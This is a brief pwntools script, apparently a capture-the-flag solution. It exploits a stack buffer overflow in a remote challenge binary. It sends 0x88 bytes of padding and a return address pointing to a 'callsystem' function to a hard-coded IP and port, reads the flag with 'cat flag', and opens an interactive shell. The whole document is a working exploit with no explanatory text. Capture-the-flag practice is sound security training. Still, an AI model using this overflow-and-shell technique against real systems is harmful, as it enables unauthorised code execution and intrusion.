# callsystem 0x400596
from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
payload = 'a' * (0x80 + 0x8) + p64(0x400596)

r = remote('111.198.29.45', 37399)
r.recvuntil('Hello, World\n')
r.sendline(payload)

r.sendline('cat flag')
r.interactive()
